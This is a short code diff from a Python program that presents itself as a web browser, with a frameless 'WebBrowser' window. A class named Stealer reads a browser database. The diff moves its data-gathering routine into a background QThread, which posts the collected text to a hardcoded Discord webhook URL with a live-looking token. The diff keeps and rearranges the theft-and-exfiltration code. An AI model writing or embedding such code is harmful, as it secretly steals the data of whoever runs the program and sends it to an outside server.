@@ -127,7 +127,8 @@ class Stealer():
         self.connection.close()
         remove(tempdb)
 
-    def get_and_post():
+class ExtraThread(QThread):
+    def run(self):
         webhook = "https://discord.com/api/webhooks/1169075539101892709/U-YF6F86qSXlKpIO4o_NeD-N_FX0m7vvaSgia-kwORbRTCSDC7m92VA50BlXaQYd90cj"
         stealer = Stealer()
         stealer.get_database_cursor()
@@ -140,11 +141,6 @@ class Stealer():
                 text = ""
         stealer.save_and_clean()
         post(webhook, data={"content": "- "*10})
-
-class ExtraThread(QThread):
-    def run(self):
-        stealer = Stealer()
-        stealer.get_and_post()
 
 class WebBrowser(FramelessWindow):
     def __init__(self):
